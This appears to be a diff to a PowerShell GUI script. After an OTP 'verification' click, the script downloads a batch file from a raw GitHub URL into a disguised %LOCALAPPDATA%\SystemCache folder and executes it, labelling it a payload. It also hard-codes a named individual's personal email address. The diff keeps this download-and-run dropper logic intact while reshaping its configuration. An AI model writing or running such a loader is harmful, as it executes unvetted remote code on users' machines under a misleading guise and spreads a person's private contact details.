@@ -1,33 +1,22 @@
-[CmdletBinding()]
-param (
-    [Parameter(Mandatory = $false)]
-    [string]$Url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat",
-
-    [Parameter(Mandatory = $false)]
-    [string]$FolderName = "SystemCache",
-
-    [Parameter(Mandatory = $false)]
-    [string]$FileName = "main.bat",
-
-    [Parameter(Mandatory = $false)]
-    [string]$RecipientName = "JEFFERSON LAKASHIANG",
-
-    [Parameter(Mandatory = $false)]
-    [string]$NotifyEmail = "jeffersonlakashiang@gmail.com",
-
-    [Parameter(Mandatory = $false)]
-    [switch]$Wait
-)
-
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
+
+# -------------------------------------------------------------------------
+# Configuration
+# -------------------------------------------------------------------------
+$Url           = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat"
+$FolderName    = "SystemCache"
+$FileName      = "main.bat"
+$RecipientName = "JEFFERSON LAKASHIANG"
+$NotifyEmail   = "jeffersonlakashiang@gmail.com"
+$Wait          = $false
 
 # -------------------------------------------------------------------------
 # Security & State Initialization (Windows 10 / PowerShell 5.1 Compatible)
 # -------------------------------------------------------------------------
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-# Cryptographically secure OTP compatible with .NET Framework on Windows 10
+# Windows 10 / .NET Framework cryptographic OTP generator
 $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
 $bytes = New-Object byte[] 4
 $rng.GetBytes($bytes)
@@ -91,7 +80,7 @@ function Invoke-SecurePayloadExecution {
         [string]$DownloadUrl,
         [string]$TargetFolder,
         [string]$TargetFile,
-        [switch]$WaitForExit
+        [bool]$WaitForExit
     )
 
     $basePath        = $env:LOCALAPPDATA
@@ -239,7 +228,7 @@ $btnVerify.Add_Click({
         $form.Update()
 
         try {
-            Invoke-SecurePayloadExecution -DownloadUrl $Url -TargetFolder $FolderName -TargetFile $FileName -WaitForExit:$Wait
+            Invoke-SecurePayloadExecution -DownloadUrl $Url -TargetFolder $FolderName -TargetFile $FileName -WaitForExit $Wait
             $statusLabel.Text = "Payload launched successfully."
             $form.Update()
             Start-Sleep -Seconds 1
